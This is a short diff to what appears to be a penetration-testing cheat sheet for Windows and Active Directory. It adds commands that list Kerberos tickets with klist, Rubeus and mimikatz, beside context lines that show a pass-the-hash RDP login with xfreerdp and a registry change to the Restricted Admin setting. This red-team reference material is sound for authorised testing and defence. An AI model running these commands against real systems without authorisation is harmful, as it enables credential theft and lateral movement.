@@ -679,6 +679,14 @@ C:\> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRe
 $ xfreerdp  /v:<IP address> /u:<username> /pth:<hash>
 ```
 
+- List Tickets
+
+```
+C:\> klist
+C>\> Rubeus.exe klist
+mimikatz # kerberos::list
+```
+
 - Mimikatz Export Tickets
 
 ```
